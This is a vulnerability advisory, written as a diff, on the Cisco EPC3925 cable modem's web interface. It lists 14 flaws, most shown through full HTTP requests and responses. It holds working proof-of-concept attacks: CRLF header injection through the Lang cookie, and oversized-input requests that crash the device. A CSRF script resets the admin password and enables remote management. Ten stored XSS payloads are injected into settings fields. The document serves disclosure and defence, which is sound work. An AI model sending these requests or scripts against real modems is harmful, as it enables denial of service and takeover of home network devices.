@@ -1,0 +1,695 @@
+# Title: Cisco EPC 3925 Multiple Vulnerabilities
+# Vendor: http://www.cisco.com/
+# Vulnerable Version(s): Cisco EPC3925 (EuroDocsis 3.0 2-PORT Voice Gateway)
+# Date: 15.09.2016
+# Author: Patryk Bogdan 
+
+========
+
+Vulnerability list:
+1. HTTP Response Injection via 'Lang' Cookie
+2. DoS via 'Lang' Cookie
+3. DoS in Wireless Client List via 'h_sortWireless'
+4. (Un)authorized modem restart (Channel Selection)
+5. CSRF
+6. Stored XSS in SMTP Settings (Administration -> Reportning)
+7. Stored XSS in User Name #1 (e.g Administration -> Managment / Setup -> Quick Setup)
+8. Stored XSS in User Name #2 (Access Restrictions -> User Setup)
+9. Stored XSS in ToD Filter (Access Restrictions -> Time of Day Rules)
+10. Stored XSS in Rule Name (Access Restrictions -> Basic Rules)
+11. Stored XSS in Domain Name (Access Restrictions -> Basic Rules)
+12. Stored XSS in Network Name (e.g Wireless -> Basic Settings)
+13. Stored XSS in DDNS Settings (Setup -> DDNS)
+14. Stored XSS in Advanced VPN Setup (Security -> VPN -> Advanced Settings)
+
+========
+
+1. HTTP Response Injection
+
+It is able to inject arbitrary data into device memory via 'Lang' cookie,
+additional data will be stored until modem restart and will be returned with every http response.
+
+#1 - Request:
+POST /goform/Docsis_system HTTP/1.1
+Host: 192.168.100.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: pl,en-US;q=0.7,en;q=0.3
+Accept-Encoding: gzip, deflate
+Referer: http://192.168.100.1/Docsis_system.asp
+Cookie: Lang=en; SessionID=171110
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 109
+
+username_login=aaa&password_login=bbb&LanguageSelect=en%0d%0aSet-Cookie: pwned&Language_Submit=0&login=Log+In
+
+#1 - Response:
+HTTP/1.0 302 Redirect
+Server: PS HTTP Server
+Location: http://192.168.100.1/Docsis_system.asp
+Content-type: text/html
+Connection: close
+(...)
+
+
+#2 - Request:
+GET / HTTP/1.1
+Host: 192.168.100.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: pl,en-US;q=0.7,en;q=0.3
+Accept-Encoding: gzip, deflate
+Connection: close
+
+#2 - Response:
+HTTP/1.1 200 OK
+Content-type: text/html
+Expires: Thu, 3 Oct 1968 12:00:00 GMT
+Pragma: no-cache
+Cache-Control: no-cache, must-revalidate
+Connection: close
+Set-Cookie: Lang=en
+Set-Cookie: pwned
+Set-Cookie: SessionID=219380
+Content-Length: 1398
+(...)
+
+
+2. DoS via 'Lang' Cookie
+
+Modem crashes when cookie variable in request is too long.
+
+#1 - Request (crash via http injection):
+POST /goform/Docsis_system HTTP/1.1
+Host: 192.168.100.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: pl,en-US;q=0.7,en;q=0.3
+Accept-Encoding: gzip, deflate
+Referer: http://192.168.100.1/Docsis_system.asp
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 142
+
+username_login=aaa&password_login=bbb&LanguageSelect=enXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX&Language_Submit=0&login=Log+In
+
+#1 - Response:
+HTTP/1.0 302 Redirect
+Server: PS HTTP Server
+Location: http://192.168.100.1/Docsis_system.asp
+Content-type: text/html
+Connection: close
+
+
+#2 - Request:
+GET /Docsis_system.asp HTTP/1.1
+Host: 192.168.100.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: pl,en-US;q=0.7,en;q=0.3
+Accept-Encoding: gzip, deflate
+Referer: http://192.168.100.1/Docsis_system.asp
+Connection: close
+
+#2 - Response:
+HTTP/1.1 200 OK
+Content-type: text/html
+Expires: Thu, 3 Oct 1968 12:00:00 GMT
+Pragma: no-cache
+Cache-Control: no-cache, must-revalidate
+Connection: close
+Set-Cookie: Lang=enXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
+Set-Cookie: SessionID=163190
+Content-Length: 18743
+(...)
+
+At this point modem crashes:
+
+C:\Users\Patryk>ping -n 10 192.168.100.1
+
+Pinging 192.168.100.1 with 32 bytes of data:
+Request timed out.
+Request timed out.
+Reply from 192.168.0.10: Destination host unreachable.
+Reply from 192.168.0.10: Destination host unreachable.
+Reply from 192.168.0.10: Destination host unreachable.
+Reply from 192.168.0.10: Destination host unreachable.
+(...)
+
+DoS can be also executed with single HTTP request, like this:
+GET / HTTP/1.1
+Host: 192.168.100.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0
+Accept: */*
+Accept-Language: pl,en-US;q=0.7,en;q=0.3
+Accept-Encoding: gzip, deflate
+Referer: http://192.168.100.1/
+Cookie: Lang=enXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX; SessionID=163190
+Connection: close
+
+
+3. DoS in Wireless Client List via 'h_sortWireless'
+
+Modem crashes when variable for POST parameter 'h_sortWireless' is too long.
+
+#1 - Request:
+POST /goform/WClientMACList HTTP/1.1
+Host: 192.168.100.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: pl,en-US;q=0.7,en;q=0.3
+Accept-Encoding: gzip, deflate
+Referer: http://192.168.100.1/WClientMACList.asp
+Cookie: Lang=en; SessionID=71750
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 94
+
+sortWireless=status&h_sortWireless=XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
+
+#1 - Response:
+HTTP/1.0 302 Redirect
+Server: PS HTTP Server
+Location: http://192.168.100.1/WClientMACList.asp
+Content-type: text/html
+Connection: close
+
+( ... crash ... )
+
+
+4. (Un)authorized channel Selection
+
+On Cisco 3925 unauthorized user can edit device channel settings and restart the modem. Such functionality should be available only for logged users, for example it's disabled on EPC 3928.
+
+
+5. CSRF
+
+There is no prevention against CSRF attacks, attacker can for example change admin credentials and enable remote managment in single request.
+
+PoC:
+    <script>
+        var xhr = new XMLHttpRequest();
+        xhr.open("POST", "http://192.168.100.1/goform/Administration", true);
+        xhr.setRequestHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
+        xhr.setRequestHeader("Accept-Language", "pl,en-US;q=0.7,en;q=0.3");
+        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+        xhr.withCredentials = true;
+        var body = "connection_mode=0&saRgIpMgmtWanDualIpAddrIP0=0&saRgIpMgmtWanDualIpAddrIP1=0&saRgIpMgmtWanDualIpAddrIP2=0&saRgIpMgmtWanDualIpAddrIP3=0&saRgIpMgmtWanDualIpRipAdvertised=0x0&wan_ip_1=0&wan_ip_2=0&wan_ip_3=0&wan_ip_4=0&wan_mask_1=0&wan_mask_2=0&wan_mask_3=0&wan_mask_4=0&wan_gw_1=0&wan_gw_2=0&wan_gw_3=0&wan_gw_4=0&Host_Name=&Domain_Name=&wan_dns1_1=0&wan_dns1_2=0&wan_dns1_3=0&wan_dns1_4=0&wan_dns2_1=0&wan_dns2_2=0&wan_dns2_3=0&wan_dns2_4=0&wan_mtuSize=0&sysname=admin&sysPasswd=newpass&sysConfirmPasswd=newpass&remote_management=enable&http_wanport=8080&upnp_enable=disable&save=Save+Settings&preWorkingMode=1&h_remote_management=enable&h_check_WebAccessUserIfLevel=2&h_upnp_enable=disable&h_wlan_enable=enable&h_user_type=common";
+        var aBody = new Uint8Array(body.length);
+        for (var i = 0; i < aBody.length; i++)
+          aBody[i] = body.charCodeAt(i);
+        xhr.send(new Blob([aBody]));
+    </script>
+
+
+
+6. Stored XSS in Administration -> Reporting
+
+#1 - Request:
+POST /goform/Log HTTP/1.1
+Host: 192.168.100.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: pl,en-US;q=0.7,en;q=0.3
+Accept-Encoding: gzip, deflate
+Referer: http://192.168.100.1/Log.asp
+Cookie: Lang=en; SessionID=457480
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 236
+
+email_enable=enable&smtp_server=%22+onmouseover%3Dalert%281%29+x%3D%22y&email_for_log=%22+onmouseover%3Dalert%282%29+x%3D%22y&SmtpUsername=%22+onmouseover%3Dalert%283%29+x%3D%22y&SmtpPassword=aaa&save=Save+Settings&h_email_enable=enable
+
+#1 - Response:
+HTTP/1.0 302 Redirect
+Server: PS HTTP Server
+Location: http://192.168.100.1/Log.asp
+Content-type: text/html
+Connection: close
+
+#2 - Request:
+GET /Log.asp HTTP/1.1
+Host: 192.168.100.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: pl,en-US;q=0.7,en;q=0.3
+Accept-Encoding: gzip, deflate
+Referer: http://192.168.100.1/Log.asp
+Cookie: Lang=en; SessionID=457480
+Connection: close
+
+#2 - Response:
+HTTP/1.1 200 OK
+Content-type: text/html
+Expires: Thu, 3 Oct 1968 12:00:00 GMT
+Pragma: no-cache
+Cache-Control: no-cache, must-revalidate
+Connection: close
+Content-Length: 6454
+(...)
+<TD>
+									<input type="text" name="smtp_server" maxlength="255" size="30" value="" onmouseover=alert(1) x="y" />
+								</TD>
+							</TR>
+							<tr>
+								<TD>
+									<script language="javascript" type="text/javascript">dw(va_log_email3);</script>
+								</TD>
+								<TD>
+									<input type="text" name="email_for_log" maxlength="255" size="30" value="" onmouseover=alert(2) x="y"/>
+								</TD>
+							</TR>
+							<tr>
+								<TD>
+									<script language="javascript" type="text/javascript">dw(msg_smtp_username);</script>
+								</TD>
+								<TD>
+									<input type="text" name="SmtpUsername" maxlength="255" size="30" value="" onmouseover=alert(3) x="y" />
+								</TD>
+							</TR>
+(...)
+
+
+7. Stored XSS in User Name (Administration -> Managment / Setup -> Quick Setup)
+
+#1 - Request:
+POST /goform/Administration HTTP/1.1
+Host: 192.168.100.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: pl,en-US;q=0.7,en;q=0.3
+Accept-Encoding: gzip, deflate
+Referer: http://192.168.100.1/Administration.asp
+Cookie: Lang=en; SessionID=457480
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 746
+
+connection_mode=0&saRgIpMgmtWanDualIpAddrIP0=0&saRgIpMgmtWanDualIpAddrIP1=0&saRgIpMgmtWanDualIpAddrIP2=0&saRgIpMgmtWanDualIpAddrIP3=0&saRgIpMgmtWanDualIpRipAdvertised=0x0&wan_ip_1=0&wan_ip_2=0&wan_ip_3=0&wan_ip_4=0&wan_mask_1=0&wan_mask_2=0&wan_mask_3=0&wan_mask_4=0&wan_gw_1=0&wan_gw_2=0&wan_gw_3=0&wan_gw_4=0&Host_Name=&Domain_Name=&wan_dns1_1=0&wan_dns1_2=0&wan_dns1_3=0&wan_dns1_4=0&wan_dns2_1=0&wan_dns2_2=0&wan_dns2_3=0&wan_dns2_4=0&wan_mtuSize=0&sysname=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E&sysPasswd=aaa&sysConfirmPasswd=aaa&remote_management=disable&upnp_enable=disable&save=Save+Settings&preWorkingMode=1&h_remote_management=disable&h_check_WebAccessUserIfLevel=2&h_upnp_enable=disable&h_wlan_enable=enable&h_user_type=common
+
+#1 - Response:
+HTTP/1.0 302 Redirect
+Server: PS HTTP Server
+Location: http://192.168.100.1/Quick_setup.asp
+Content-type: text/html
+Connection: close
+
+#2 - Request:
+GET /Quick_setup.asp HTTP/1.1
+Host: 192.168.100.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: pl,en-US;q=0.7,en;q=0.3
+Accept-Encoding: gzip, deflate
+Referer: http://192.168.100.1/Administration.asp
+Cookie: Lang=en; SessionID=457480
+Connection: close
+
+#2 - Response:
+HTTP/1.1 200 OK
+Content-type: text/html
+Expires: Thu, 3 Oct 1968 12:00:00 GMT
+Pragma: no-cache
+Cache-Control: no-cache, must-revalidate
+Connection: close
+Content-Length: 34779
+(...)
+<tr>
+  <td nowrap>
+    <script language="javascript" type="text/javascript">dw(va_local_access2);</script>
+  </td>
+  <td nowrap>
+    <script>alert('XSS')</script>
+  </td>
+</tr>
+(...)
+
+
+8. Stored XSS in User Name #2 (Access Restrictions -> User Setup)
+
+#1 - Request:
+POST /goform/Rg_UserSetup HTTP/1.1
+Host: 192.168.100.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: pl,en-US;q=0.7,en;q=0.3
+Accept-Encoding: gzip, deflate
+Referer: http://192.168.100.1/Rg_UserSetup.asp
+Cookie: Lang=en; SessionID=1320560
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 118
+
+NewUser=user onmouseover=alert('XSS')&Btn_AddUser=Add+User&AddUser=1&UserList=Default&RemoveUser=0&UserConfigChanged=0
+
+#1 - Response:
+HTTP/1.0 302 Redirect
+Server: PS HTTP Server
+Location: http://192.168.100.1/Rg_UserSetup.asp
+Content-type: text/html
+Connection: close
+
+#2 - Request:
+GET /Rg_UserSetup.asp HTTP/1.1
+Host: 192.168.100.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: pl,en-US;q=0.7,en;q=0.3
+Accept-Encoding: gzip, deflate
+Referer: http://192.168.100.1/Rg_UserSetup.asp
+Cookie: Lang=en; SessionID=1320560
+Connection: close
+
+#2 - Response:
+HTTP/1.1 200 OK
+Content-type: text/html
+Expires: Thu, 3 Oct 1968 12:00:00 GMT
+Pragma: no-cache
+Cache-Control: no-cache, must-revalidate
+Connection: close
+Content-Length: 9706
+(...)
+<select onchange="submit();" name="UserList">
+											<option value=Default >1. Default<option value=user onmouseover=alert('XSS') selected>2. user onmouseover=alert('XSS
+</select>
+(...)
+
+
+9. Stored XSS in ToD Filter
+
+#1 - Request:
+POST /goform/Rg_TodFilter HTTP/1.1
+Host: 192.168.100.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: pl,en-US;q=0.7,en;q=0.3
+Accept-Encoding: gzip, deflate
+Referer: http://192.168.100.1/Rg_TodFilter.asp
+Cookie: Lang=en; SessionID=1320560
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 189
+
+TodClient=<script>alert('XSS')</script>&TodAdd=Add&addTodClient=1&ToDComputers=No+filters+entered.&removeTodClient=&StartHour=12&StartMinute=00&StartAmPm=1&EndHour=12&EndMinute=00&EndAmPm=1
+
+#1 - Response:
+HTTP/1.0 302 Redirect
+Server: PS HTTP Server
+Location: http://192.168.100.1/Rg_TodFilter.asp
+Content-type: text/html
+Connection: close
+
+#2 - Request:
+GET /Rg_TodFilter.asp HTTP/1.1
+Host: 192.168.100.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: pl,en-US;q=0.7,en;q=0.3
+Accept-Encoding: gzip, deflate
+Referer: http://192.168.100.1/Rg_TodFilter.asp
+Cookie: Lang=en; SessionID=1320560
+Connection: close
+
+#2 - Response:
+HTTP/1.1 200 OK
+Content-type: text/html
+Expires: Thu, 3 Oct 1968 12:00:00 GMT
+Pragma: no-cache
+Cache-Control: no-cache, must-revalidate
+Connection: close
+Content-Length: 9140
+(...)
+<select name="ToDComputers" onChange="submit();">
+										<option value=0 selected>1. <script>alert('XSS')</script>
+</select>
+(...)
+
+
+10. Stored XSS in Rule Name (Access Restrictions -> Basic Rules)
+
+#1 - Request:
+POST /goform/Rg_ParentalBasic HTTP/1.1
+Host: 192.168.100.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: pl,en-US;q=0.7,en;q=0.3
+Accept-Encoding: gzip, deflate
+Referer: http://192.168.100.1/Rg_ParentalBasic.asp
+Cookie: Lang=en; SessionID=1320560
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 282
+
+NewContentRule=<script>alert('XSS')</script>&AddRule=Add+Rule&AddContentRule=1&ContentRules=0&RemoveContentRule=0&NewKeyword=&KeywordAction=0&NewDomain=&DomainAction=0&NewAllowedDomain=&AllowedDomainAction=0&ParentalPassword=*******&ParentalPasswordReEnter=*******&AccessDuration=30
+
+#1 - Response:
+HTTP/1.0 302 Redirect
+Server: PS HTTP Server
+Location: http://192.168.100.1/Rg_ParentalBasic.asp
+Content-type: text/html
+Connection: close
+
+#2 - Request:
+GET /Rg_ParentalBasic.asp HTTP/1.1
+Host: 192.168.100.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: pl,en-US;q=0.7,en;q=0.3
+Accept-Encoding: gzip, deflate
+Referer: http://192.168.100.1/Rg_ParentalBasic.asp
+Cookie: Lang=en; SessionID=1320560
+Connection: close
+
+#2 - Response:
+HTTP/1.1 200 OK
+Content-type: text/html
+Expires: Thu, 3 Oct 1968 12:00:00 GMT
+Pragma: no-cache
+Cache-Control: no-cache, must-revalidate
+Connection: close
+Content-Length: 11126
+(...)
+<select name="ContentRules" onChange="submit();">
+										<option value=0 selected>1. Default<option value=1 >2. <script>alert('XSS')</script>
+</select>
+(...)
+
+
+11. Stored XSS in Domain Name (Access Restrictions -> Basic Rules)
+
+#1 - Request:
+POST /goform/Rg_ParentalBasic HTTP/1.1
+Host: 192.168.100.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: pl,en-US;q=0.7,en;q=0.3
+Accept-Encoding: gzip, deflate
+Referer: http://192.168.100.1/Rg_ParentalBasic.asp
+Cookie: Lang=en; SessionID=1320560
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 318
+
+NewContentRule=&AddContentRule=&ContentRules=0&RemoveContentRule=0&NewKeyword=&KeywordAction=0&NewDomain=&DomainAction=0&NewAllowedDomain=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E&AddAllowedDomain=Add+Allowed+Domain&AllowedDomainAction=1&ParentalPassword=*******&ParentalPasswordReEnter=*******&AccessDuration=30
+
+#1 - Response:
+HTTP/1.0 302 Redirect
+Server: PS HTTP Server
+Location: http://192.168.100.1/Rg_ParentalBasic.asp
+Content-type: text/html
+Connection: close
+
+#2 - Request:
+GET /Rg_ParentalBasic.asp HTTP/1.1
+Host: 192.168.100.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: pl,en-US;q=0.7,en;q=0.3
+Accept-Encoding: gzip, deflate
+Referer: http://192.168.100.1/Rg_ParentalBasic.asp
+Cookie: Lang=en; SessionID=1320560
+Connection: close
+
+#2 - Response:
+HTTP/1.1 200 OK
+Content-type: text/html
+Expires: Thu, 3 Oct 1968 12:00:00 GMT
+Pragma: no-cache
+Cache-Control: no-cache, must-revalidate
+Connection: close
+Content-Length: 10741
+(...)
+<select name="AllowedDomainList" size=5>
+											<option value="1"><script>alert('XSS')</script>
+</select>
+(...)
+
+
+12. Stored XSS in Network Name (e.g Wireless -> Basic Settings)
+
+#1 - Request:
+POST /goform/Quick_setup HTTP/1.1
+Host: 192.168.100.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: pl,en-US;q=0.7,en;q=0.3
+Accept-Encoding: gzip, deflate
+Referer: http://192.168.100.1/Quick_setup.asp
+Cookie: Lang=en; SessionID=1320560
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 371
+
+Password=&PasswordReEnter=&setup_wifi_enable=enable&ssid=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E&security_mode=psk2_mixed&wpa_enc=tkip%2Baes&wpa_psk_key=231503725&radius_ip_1=0&radius_ip_2=0&radius_ip_3=0&radius_ip_4=0&keysize=64&tx_key=1&save=Save+Settings&h_setup_wifi_enable=enable&h_security_mode=psk2_mixed&h_wpa_enc=tkip%2Baes&qs_wds_setting=disable&UserId=
+
+#1 - Response:
+HTTP/1.0 302 Redirect
+Server: PS HTTP Server
+Location: http://192.168.100.1/Quick_setup.asp
+Content-type: text/html
+Connection: close
+
+#2 - Request:
+GET /Wireless.asp HTTP/1.1
+Host: 192.168.100.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: pl,en-US;q=0.7,en;q=0.3
+Accept-Encoding: gzip, deflate
+Referer: http://192.168.100.1/Quick_setup.asp
+Cookie: Lang=en; SessionID=1320560
+Connection: close
+
+#2 - Response:
+HTTP/1.1 200 OK
+Content-type: text/html
+Expires: Thu, 3 Oct 1968 12:00:00 GMT
+Pragma: no-cache
+Cache-Control: no-cache, must-revalidate
+Connection: close
+Content-Length: 51653
+(...)
+<tr>
+									<td>
+										<B><script language="javascript" type="text/javascript">dw(vwnetwork_name);</script></B>
+									</td>
+									<td colspan="2">
+										<script>alert('XSS')</script>
+									</td>
+								</tr>
+(...)
+
+
+13. Stored XSS in DDNS Settings (Setup -> DDNS)
+
+#1 - Request:
+POST /goform/Setup_DDNS HTTP/1.1
+Host: 192.168.100.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: pl,en-US;q=0.7,en;q=0.3
+Accept-Encoding: gzip, deflate
+Referer: http://192.168.100.1/Setup_DDNS.asp
+Cookie: Lang=en; SessionID=1320560
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 154
+
+DdnsService=0&DdnsUserName=user" onmouseover=alert('XSS_1') x="&DdnsPassword=aaa x="&DdnsHostName=host" onmouseover=alert('XSS_2') x="y&save=Save+Settings
+
+#1 - Response:
+HTTP/1.0 302 Redirect
+Server: PS HTTP Server
+Location: http://192.168.100.1/Setup_DDNS.asp
+Content-type: text/html
+Connection: close
+
+#2 - Request:
+GET /Setup_DDNS.asp HTTP/1.1
+Host: 192.168.100.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: pl,en-US;q=0.7,en;q=0.3
+Accept-Encoding: gzip, deflate
+Referer: http://192.168.100.1/Setup_DDNS.asp
+Cookie: Lang=en; SessionID=1320560
+Connection: close
+
+#2 - Response:
+HTTP/1.1 200 OK
+Content-type: text/html
+Expires: Thu, 3 Oct 1968 12:00:00 GMT
+Pragma: no-cache
+Cache-Control: no-cache, must-revalidate
+Connection: close
+Content-Length: 5738
+(...)
+<td>
+									<input name="DdnsUserName" type="text" size="16" maxlength="64" value="user" onmouseover=alert('XSS_1') x="" />
+</td>
+(...)
+<td>
+									<input name="DdnsHostName" type="text" size="32" maxlength="256" value="host" onmouseover=alert('XSS_2') x="y" />
+</td>
+(...)
+
+
+14. Stored XSS in Adv. VPN Setup (Security -> VPN -> Advanced Settings)
+
+#1 - Request:
+POST /goform/vpn_adv HTTP/1.1
+Host: 192.168.100.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: pl,en-US;q=0.7,en;q=0.3
+Accept-Encoding: gzip, deflate
+Referer: http://192.168.100.1/vpn_adv.asp
+Cookie: Lang=en; SessionID=1320560
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 286
+
+NegotiationMode=0&LocalIdentityType=2&LocalIdentity=abc%22+onmouseover%3Dalert%28%27XSS%27%29+x%3D%22y&RemoteIdentityType=2&RemoteIdentity=abc%22+onmouseover%3Dalert%28%27XSS%27%29+x%3D%22y&Phase1Encryption=2&Phase1Authentication=1&Phase1DhGroup=0&Phase1SaLifetime=28800&Phase2DhGroup=0
+
+#1 - Response:
+HTTP/1.0 302 Redirect
+Server: PS HTTP Server
+Location: http://192.168.100.1/vpn_adv.asp
+Content-type: text/html
+Connection: close
+
+#2 - Request:
+GET /vpn_adv.asp HTTP/1.1
+Host: 192.168.100.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: pl,en-US;q=0.7,en;q=0.3
+Accept-Encoding: gzip, deflate
+Referer: http://192.168.100.1/vpn_adv.asp
+Cookie: Lang=en; SessionID=1320560
+Connection: close
+
+#2 - Response:
+HTTP/1.1 200 OK
+Content-type: text/html
+Expires: Thu, 3 Oct 1968 12:00:00 GMT
+Pragma: no-cache
+Cache-Control: no-cache, must-revalidate
+Connection: close
+Content-Length: 10179
+(...)
+<td>
+													<input type="radio" name="LocalIdentityType" value="2" onClick="LocalIdentityTypeClicked();" />
+													<script language="javascript" type="text/javascript">dw(vs_identity_name);</script>
+													<input type="text" name="LocalIdentity" size="16" maxlength="32" value="abc" onmouseover=alert('XSS') x="y" />
+</td>
+(...)
+<tr>
+												<td>
+													<input type="radio" name="RemoteIdentityType" value="2" onClick="RemoteIdentityTypeClicked();">
+													<script language="javascript" type="text/javascript">dw(vs_identity_name);</script>
+													<input type="text" name="RemoteIdentity" size="16" maxlength="32" value="abc" onmouseover=alert('XSS') x="y" />
+												</td>
+</tr>
+(...)
